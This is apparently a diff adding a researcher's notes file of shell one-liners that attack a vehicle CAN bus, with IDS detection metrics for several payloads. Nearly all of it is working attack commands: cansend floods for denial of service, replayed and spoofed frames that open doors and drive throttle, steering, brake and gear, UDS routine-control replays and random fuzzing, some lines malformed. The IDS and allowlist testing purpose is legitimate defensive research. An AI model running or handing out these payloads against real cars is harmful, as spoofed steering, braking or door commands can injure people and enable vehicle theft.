@@ -1,0 +1,362 @@
+#CAN DoS attack on KCAN4
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend kcan4 000#0000; done; sleep 5; done
+
+#CAN DoS attack on VCAN0
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 000#0000; done; sleep 5; done
+
+
+#CAN Replay on doors
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend kcan4 0000024B#550801010000000F; sleep 1; done; cansend kcan4 0000024B#000801010000000F; sleep 5; done
+
+#CAN Replay on throttle
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 0000024B#5508010100000012; sleep 1; done; sleep 5; done
+
+#CAN Replay on steering
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 000000C4#5FFFFFFF0000003A; sleep 0.5; done; sleep 5; done
+
+#CAN Fuzzing on doors
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend kcan4 24B#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM);sleep 0.2; done; sleep 5; done
+
+#CAN Fuzzing on throttle
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 1A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM);sleep 0.2; done; sleep 5; done
+
+#CAN Fuzzing on steering
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM);sleep 0.2; done; sleep 5; done
+
+#UDS Replay on doors
+for cycle in {1..5}; do cansend vcan0 7E0#053101020364; sleep 5; cansend vcan0 7E0#053101020364; sleep 5; done
+
+#UDS Replay on throttle
+for cycle in {1..5}; do cansend vcan0 7E0#05310101A964; sleep 5; cansend vcan0 7E0#05310201A964; sleep 5; done
+
+#UDS Replay on steering
+for cycle in {1..5}; do cansend vcan0 7E0#05310104F15F; sleep 5; cansend vcan0 7E0#05310204F15F; sleep 5; done
+
+#UDS Fuzzing on doors
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 3 ]] && break; cansend vcan0 7E0#$(printf 0731010203"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 7E0#053101020364;
+
+#UDS Fuzzing on throttle
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 7E0#$(printf 07310101A9"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 7E0#05310201A964
+
+
+#UDS Fuzzing on steering
+sleep 3; for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 7E0#$(printf 07310104F1"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 7E0#05310204F15F
+
+
+#UDS Replay on brake
+for cycle in {1..5}; do cansend vcan0 7E0#053101020550; sleep 5; cansend vcan0 7E0#0431020205; sleep 5; done
+
+#UDS Replay on gear
+for cycle in {1..5}; do cansend vcan0 7E0#05310104F5FF; sleep 5; cansend vcan0 7E0#04310204F5; sleep 5; done
+
+while true; do cansend vcan0 000000C4#000000FF00000001; done
+while true; do cansend vcan0 7E0#05310101A964; done
+while true; do cansend vcan0 000000C4#5FFFFFFF0000003A; sleep 0.5; done;
+
+
+#test SecurityAccess
+cansend vcan0 123#022703; cansend vcan0 123#300000; sleep 1; cansend vcan0 123#1012270400010203; cansend vcan0 123#210405060708090A; cansend vcan0 123#220B0C0D0E10;
+
+#throttle
+while true; do cansend vcan0 000001A0#5508010100000012; sleep 0.1; done
+#steer 
+while true; do cansend vcan0 000000C4#5FFFFFFF0000003A;
+
+#random all
+while true; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM); sleep 0.1; done
+#random id only
+while true; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#5508010100000012; sleep 0.1; done
+#random payload only
+while true; do cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM);sleep 0.1; done
+
+
+
+VALID_IDS = ["0xce", "0x24b", "0x2f6", "0x1a0", "0xc4", "0x1b4", "0xba", "0xbb"]
+
+
+#---------------------------------------
+#-- Network Allowlist Experiment test --
+#---------------------------------------
+
+#--- Attacker 1 - In the HeadUnit, sending CAN message to the door 
+### Payload1 - kcan_dos_nowhitelist: while true; do cansend kcan4 000#0000; done - Expectation: DOS attack
+### Payload2 - kcan_replay_nowhitelist: while true; do cansend kcan4 0000024B#550801010000000F; done - Expectation: Door open
+### Payload3 - kcan_fuzz_nowhitelist: while true; do cansend kcan4 $(printf "%03X" $((RANDOM % 2048)))#550801010000000F; done - Expecation: Door open sometime and DOS attack
+### Payload4 - kcan_dos_withwhitelist: while true; do cansend kcan4 000#0000; done - Expectation: Perfect run
+### Payload5 - kcan_replay_withwhitelist: while true; do cansend kcan4 0000024B#550801010000000F; done - Expectation: Door open
+### Payload6 - kcan_fuzz_withwhitelist: while true; do cansend kcan4 $(printf "%03X" $((RANDOM % 2048)))#550801010000000F; done - Expectation: Door open sometime
+
+
+#--- Attacker 2 - In the HeadUnit, sending UDS message to the throttle
+### Payload1 - uds_replay_nowhitelist: cansend vcan0 7E0#05310101A964; done - Expectation: Collision
+### Payload2 - uds_fuzzing_nowhitelist: while true; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf 07310101A9"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); done done - Expectation: Collision
+### Payload3 - uds_replay_withwhitelist: cansend vcan0 7E0#05310101A964; done - Expectation: Collision
+### Payload4 - uds_fuzzing_withwhitelist:  while true; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf 07310101A9"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); done - Expectation: Collision
+
+
+
+#---------------------------------------
+#-- IDS Experiment test --
+#---------------------------------------
+
+### Payload 1: can spoof EDME (throttle forward signal)
+cansend vcan0 000001A0#781000f0203002ca
+while true; do cansend vcan0 000001A0#781000f0203002ca; done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000001A0#781000f0203002ca; done; sleep 8; done
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 675.000
+ False Negative (Missed Attacks)  21.000
+   False Positive (Extra Alerts)  55.000
+         True Negative (Unknown) 308.000
+                       Precision   0.925
+                          Recall   0.970
+                        F1-Score   0.947
+                        Accuracy   0.928
+
+### Payload 2: can spoof EDME (throttle brake signal)
+#throttle 
+cansend vcan0 000001A0#501064f020300206
+while true; do cansend vcan0 000001A0#501064f020300206; done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000001A0#501064f020300206; done; sleep 8; done
+
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 569.000
+ False Negative (Missed Attacks)   2.000
+   False Positive (Extra Alerts)  50.000
+         True Negative (Unknown) 292.000
+                       Precision   0.919
+                          Recall   0.996
+                        F1-Score   0.956
+                        Accuracy   0.943
+
+@nothrottle 
+cansend vcan0 000001A0#460064f1203002ed
+while true; do cansend vcan0 000001A0#460064f1203002ed; done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000001A0#460064f1203002ed; done; sleep 8; done
+
+### Payload 3: can spoof EDME (throttle reverse signal)
+cansend vcan0 000001A0#642000f0203002c6
+while true; do cansend vcan0 000001A0#642000f0203002c6; done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000001A0#642000f0203002c6; done; sleep 8; done
+
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 633.000
+ False Negative (Missed Attacks)  23.000
+   False Positive (Extra Alerts)  48.000
+         True Negative (Unknown) 294.000
+                       Precision   0.930
+                          Recall   0.965
+                        F1-Score   0.947
+                        Accuracy   0.929
+
+
+
+### Payload 4: can spoof EPS (steer signal) 
+cansend vcan0 000000c4#4500000001000065
+while true; do cansend vcan0 000000c4#4500000001000065; done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000000c4#4500000001000065; done; sleep 8; done
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 512.000
+ False Negative (Missed Attacks)   5.000
+   False Positive (Extra Alerts)  39.000
+         True Negative (Unknown) 294.000
+                       Precision   0.929
+                          Recall   0.990
+                        F1-Score   0.959
+                        Accuracy   0.948
+						
+						
+### Payload 5: can fuzz data on EDME (with id 0x1A0)
+cansend vcan0 000001A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+while true; do cansend vcan0 000001A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM); done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000001A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM); done; sleep 8; done
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 844.000
+ False Negative (Missed Attacks)   2.000
+   False Positive (Extra Alerts)  73.000
+         True Negative (Unknown) 286.000
+                       Precision   0.920
+                          Recall   0.998
+                        F1-Score   0.957
+                        Accuracy   0.938
+
+
+### Payload 6: can fuzz data on EPS (with id 0xC4)
+cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+while true; do cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM); done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM); done; sleep 8; done
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 560.000
+ False Negative (Missed Attacks)  16.000
+   False Positive (Extra Alerts)  43.000
+         True Negative (Unknown) 282.000
+                       Precision   0.929
+                          Recall   0.972
+                        F1-Score   0.950
+                        Accuracy   0.935
+
+### Payload 7: can fuzz on vcan0 (random id, and random payload )
+while true; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf "%04X%01010000%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+while true; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf "%04X%01010000%04X" $RANDOM $RANDOM $RANDOM $RANDOM); done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM); done; sleep 8; done
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 669.000
+ False Negative (Missed Attacks)  18.000
+   False Positive (Extra Alerts)  55.000
+         True Negative (Unknown) 297.000
+                       Precision   0.924
+                          Recall   0.974
+                        F1-Score   0.948
+                        Accuracy   0.930
+						
+### Payload 8: can dos (id 0x00)
+cansend vcan0 000#0000
+while true; do cansend vcan0 000#0000; done
+sleep 10; while true; do end=$((SECONDS+5)); while [ $SECONDS -lt $end ]; do cansend vcan0 000#0000; done; sleep 8; done
+
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks) 686.000
+ False Negative (Missed Attacks)  11.000
+   False Positive (Extra Alerts)  52.000
+         True Negative (Unknown) 285.000
+                       Precision   0.930
+                          Recall   0.984
+                        F1-Score   0.956
+                        Accuracy   0.939
+
+
+### Payload 9: run all
+=== IDS Detection Evaluation Summary ===
+                          Metric   Value
+True Positive (Detected Attacks)  88.000
+ False Negative (Missed Attacks)  94.000
+   False Positive (Extra Alerts) 109.000
+         True Negative (Unknown) 583.000
+                       Precision   0.447
+                          Recall   0.484
+                        F1-Score   0.464
+                        Accuracy   0.768
+
+
+#---------------------------------------
+#-- IDS Experiment test - old version --
+#---------------------------------------
+
+### Payload 1: CAN DoS attack on KCAN4
+cansend kcan4 000#0000
+
+### Payload 2:CAN DoS attack on VCAN0
+cansend vcan0 000#0000
+
+### Payload 3: CAN Replay on doors
+#open
+cansend kcan4 0000024B#550801010000000F
+#close
+cansend kcan4 0000024B#000801010000000F
+
+### Payload 4: Replay on throttle
+cansend vcan0 0000024B#5508010100000012
+
+### Payload 5: Replay on steering
+cansend vcan0 000000C4#5FFFFFFF0000003A 
+
+### Payload 6: CAN Fuzzing on doors
+cansend kcan4 24B#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+
+### Payload 7: CAN Fuzzing on throttle
+cansend vcan0 1A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+while true; do cansend vcan0 000001A0#$(printf "%02X%02X%02X%02X%02X%02X%02X%02X" $((RANDOM%256)) $((RANDOM%256)) 0 0 0 0 0 $((RANDOM%256))); sleep 2; done
+
+### Payload 8: CAN Fuzzing on steering
+cansend vcan0 000000C4#$(printf "%04X%01010000%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+
+### Payload 9: UDS Replay on doors
+#start then stop
+cansend vcan0 7E0#053101020364; sleep 1; cansend vcan0 7E0#053101020364
+
+### Payload 10: UDS Replay on throttle
+#start then stop
+cansend vcan0 7E0#05310101A964; sleep 1; cansend vcan0 7E0#05310201A964
+
+### Payload 11: UDS Replay on steering
+#start then stop
+cansend vcan0 7E0#05310104F15F; sleep 1; cansend vcan0 7E0#05310204F15F
+
+### Payload 12: UDS Replay on brake
+#start then stop
+cansend vcan0 7E0#053101020550; sleep 1; cansend vcan0 7E0#0431020205
+
+### Payload 13: UDS Replay on gear
+#start then stop
+cansend vcan0 7E0#05310104F5FF; sleep 5; cansend vcan0 7E0#04310204F5
+
+### Payload 14: UDS Fuzzing on throttle and steer and door
+cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf 073101"%02X%02X%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 )))
+
+payloads=(
+'cansend kcan4 000#0000'                                           # 1 DoS KCAN4
+'cansend vcan0 000#0000'                                           # 2 DoS VCAN0
+'cansend kcan4 0000024B#550801010000000F'                          # 3 replay open door
+'cansend kcan4 0000024B#000801010000000F'                          # 4 replay close door
+'cansend vcan0 000001A0#5508010200000012'                          # 5 replay throttle
+'cansend vcan0 000000C4#5FFFFFFF0000003A'                          # 6 replay steering
+'cansend kcan4 0000024B#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'  # 7 fuzz door
+'cansend vcan0 000001A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'   # 8 fuzz throttle
+'cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)' # 9 fuzz steering
+'cansend vcan0 000000BA#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'  # 10 fuzz GearSelectorSwitch
+'cansend vcan0 000000C4#$(printf "%02X%02X%02X%02X%02X%02X%02X%02X" $((RANDOM%256)) $((RANDOM%256)) 0 0 0 0 0 $((RANDOM%256)))' # 11 spoof steer
+'cansend vcan0 000000BA#$(printf "%02X%02X%02X%02X%02X%02X%02X%02X" $((RANDOM%4)) 0 0 0 0 $((RANDOM%256)) 0 $((RANDOM%256)))' # 12 spoof gear
+'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $((high | 0x10))); printf "%s%s0000000000%02X" "$low" "$b1" $((RANDOM%256)))' #13 spoof forward
+'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $((high | 0x20))); printf "%s%s0000000000%02X" "$low" "$b1" $((RANDOM%256)))'  #14 spoof reverse
+'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $high); b2=$(printf "%02X" $((RANDOM%256))); b3=01; printf "%s%s%s%s000000%02X" "$low" "$b1" "$b2" "$b3" $((RANDOM%256)))'  # 15 spoof brake
+'cansend vcan0 000001A0#$(speed=$((RANDOM%200)); low=$(printf "%02X" $((speed & 0xFF))); high=$(( (speed >> 8) & 0x0F )); b1=$(printf "%02X" $high); b2=00; b3=01; printf "%s%s%s%s000000%02X" "$low" "$b1" "$b2" "$b3" $((RANDOM%256)))'  # 16 spoof brakeactive
+'cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)'  # 17 random ID
+
+
+
+
+
+
+### Payload 1: can spoof EDME (throttle forward signal)
+cansend vcan0 000001A0#781000f0203002ca
+
+
+
+
+
+### Payload 2: can spoof EDME (throttle brake signal)
+#throttle 
+cansend vcan0 000001A0#501064f020300206
+
+
+
+
+
+
+### Payload 3: can spoof EDME (throttle reverse signal)
+cansend vcan0 000001A0#642000f0203002c6
+### Payload 4: can spoof EPS (steer signal)
+cansend vcan0 000000C4#6400000001000065
+### Payload 5: can fuzz data on EDME (with id 0x1A0)
+cansend vcan0 000001A0#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+### Payload 6: can fuzz data on EPS (with id 0xC4)
+cansend vcan0 000000C4#$(printf "%04X%01010000%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+### Payload 7: can fuzz on vcan0 (random id, and random payload )
+while true; do cansend vcan0 $(printf "%03X" $((RANDOM % 2048)))#$(printf "%04X%01010000%04X" $RANDOM $RANDOM $RANDOM $RANDOM)
+### Payload 8: can dos (id 0x00)
+cansend vcan0 000#0000
